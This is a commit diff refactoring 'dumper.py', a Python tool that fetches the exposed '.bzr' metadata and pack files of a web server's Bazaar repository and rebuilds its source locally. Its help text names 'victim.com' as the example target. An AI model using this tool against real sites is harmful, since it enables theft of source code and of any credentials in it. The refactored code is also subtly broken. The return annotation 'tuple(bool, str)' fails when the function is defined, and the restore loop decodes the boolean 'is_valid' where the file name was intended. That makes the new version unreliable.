7f0f3d617f10f7bdb107dd7842d530df7c0d6e75
SeahunOh <shpik.korea@mail.com>
2020-08-02 17:36:48 +0900

    Refactoring

--- dumper.py
+++ dumper.py
@@ -1,20 +1,20 @@
 #!/usr/bin/python3
 # Author : shpik (shpik.korea at gmail.com)
 
-import requests
-import sys
-import subprocess
 import os
+import requests
+import subprocess
+
 import argparse
 
-def checkValidation():
-	p = subprocess.Popen(['bzr','check'],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def check_validation()->tuple(bool, str):
+	p = subprocess.Popen(["bzr","check"],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	_,m = p.communicate()
-	if b'ERROR' not in m:
-		return True
-	return m.split(b'.bzr/')[1].split(b'\'')[0].split(b'/')[-1].split(b'.')[0]
+	if b"ERROR" not in m:
+		return True, ""
+	return False, m.split(b".bzr/")[1].split(b"\'")[0].split(b"/")[-1].split(b".")[0]
 
-def getData(url):
+def get_data(url: str)->str:
 	try:
 		r = requests.get(url)
 		return r.content
@@ -22,60 +22,61 @@ def getData(url):
 		print(e)
 		exit(1)
 
-def doDump(url):
-	if url[-1] != '/':
-		url += '/'
-	prefix = '.bzr/'
+def do_dump(url: str)->None:
+	if url[-1] != "/":
+		url += "/"
+	prefix = ".bzr/"
 	initials = [
-		'repository/pack-names',
-		'README',
-		'checkout/dirstate',
-		'checkout/views',
-		'branch/branch.conf',
-		'branch/format',
-		'branch/last-revision',
-		'branch/tag',
+		"repository/pack-names",
+		"README",
+		"checkout/dirstate",
+		"checkout/views",
+		"branch/branch.conf",
+		"branch/format",
+		"branch/last-revision",
+		"branch/tag",
 	]
 	restore_path = [
-		["repository/indices/",".cix"],
-		["repository/indices/",".iix"],
-		["repository/indices/",".rix"],
-		["repository/indices/",".six"],
-		["repository/indices/",".tix"],
-		["repository/packs/",".pack"]
+		["repository/indices/", ".cix"],
+		["repository/indices/", ".iix"],
+		["repository/indices/", ".rix"],
+		["repository/indices/", ".six"],
+		["repository/indices/", ".tix"],
+		["repository/packs/", ".pack"]
 	]
 	print("[!] Target : {}".format(url))
 	print("[+] Start.")
 	for initial in initials:
 		print("[+] GET {}".format(initial))
-		with open(prefix+initial,'wb') as f:
-			r = getData(url+prefix+initial)
+		with open(prefix+initial,"wb") as f:
+			r = get_data(url + prefix + initial)
 			f.write(r)
 	
 	while 1:
-		fn = checkValidation()
-		if fn == True:
+		is_valid, empty_file  = check_validation()
+		if is_valid:
 			break
-		print("[+] GET {}".format(fn))
+		print(f"[+] GET {empty_file}.")
 		for res in restore_path:
-			np = prefix+res[0]+fn.decode('utf-8')+res[1]
+			np = prefix+res[0]+is_valid.decode("utf-8")+res[1]
 			restore_url = url+np
-			with open(np,'wb') as f:
-				r = getData(restore_url)
+			with open(np,"wb") as f:
+				r = get_data(restore_url)
 				f.write(r)
 
-	print("[*] Finish")
+	print("[*] Finish!")
+
 
 if __name__=="__main__":
-	parser = argparse.ArgumentParser(description='bazaar dump tools developed by shpik(shpik.korea at gmail.com)')
-	parser.add_argument('-u',"--url",
-                    help='url for dump.(e.g. http://victim.com/')
-	parser.add_argument('-o',"--output", default="output",
-                    help='output dir.')
+	parser = argparse.ArgumentParser(description="bazaar dump tools developed by shpik(shpik.korea at gmail.com)")
+	parser.add_argument("-u","--url",
+					help="url for dump.(e.g. http://victim.com/")
+	parser.add_argument("-o","--output", default="output",
+					help="output dir.")
 
 	args = parser.parse_args()
 	os.mkdir(args.output)
 	os.chdir(args.output)
-	os.system('bzr init')
-	doDump(args.url)
-	os.system('bzr revert')
+	os.system("bzr init")
+	do_dump(args.url)
+	os.system("bzr revert")
